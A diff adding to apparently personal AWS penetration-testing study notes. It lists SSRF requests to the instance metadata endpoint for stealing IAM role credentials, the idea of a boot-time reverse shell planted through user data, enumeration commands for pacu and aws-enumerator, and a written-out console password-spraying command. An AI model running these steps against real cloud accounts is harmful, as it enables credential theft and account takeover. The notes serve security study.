@@ -4,10 +4,73 @@ Leaking Secrets in Repo
 Traditional Phishing
 Exploiting resources
 
+how to find bucket names:
+  grayhat warfare
+  cloudenum (bruteforcing)
+  check http history
+
 https://pastebin.com/4a8SY6gr
 
 each user has access key and secret key
 
 ec2 is virtual machine on cloud
-role: each role has temp credentials
-  each role has access key and secret key
+  role: each role has temp credentials
+    each role has access key and secret key for limited time (hrs)
+long term credentials as user credentials
+
+AKIA: -> LONG TERM
+ASIA: -> SHORT TERM
+
+SSRF -> obligate a target to send a request and you can read the response
+
+http://169.254.169.254/latest/meta-data/iam/security-credentials/ // get roles
+
+who.is
+  I check if url is aws server
+user data:
+  http://169.254.169.254/latest/userData
+
+AWS Permissions
+IAM Action
+
+permissions attack
+  modify user attribute (modify user data and run reverse shell on the boot of the system)
+  lamda:UpdateFunctionCode (also you can get rce)
+
+you have permission to list policies/roles attached to you
+  assume you don't have this permission
+
+aws s3 ls://bucketName // get permissions on the bucket
+aws enumerator (tests functions)
+
+trufflehog (tool tells me if there are secrets in file)
+
+
+framework for aws pentesting: pacu
+  import_keys
+    it gets it from /home/mansour/.aws/config
+  search ec2
+  search permission
+  run // permissionName
+another tool: aws enumerator
+  cd /home/mansour/go/bin
+  ./aws-enumerator
+  cat .env
+  cred (if it didn't fill them then get from /home/mansour/.aws/credentials)
+
+  to get region // curl -i http://bucketLink
+    and you get region
+    ./aws-enumerator enum
+    ./aws-enumerator dump -services dynamodb // try a service from the command above to get permissions
+    aws dynamodb list-tables --region us-east-1
+    aws dynamodb scan table-name tableName --region us-east-1
+
+go aws console spray
+  provide account id, username, and password
+  // note you can get account id from s3 bucket
+  aws sts get-caller-identity
+    then I get info
+    ./GoAWSConsoleSpray -a accountId -u /home/mansour/test/users.txt -p /home/mansour/test/passwords.txt
+another tool: aws service enum
+another scanning tool: prawler
+
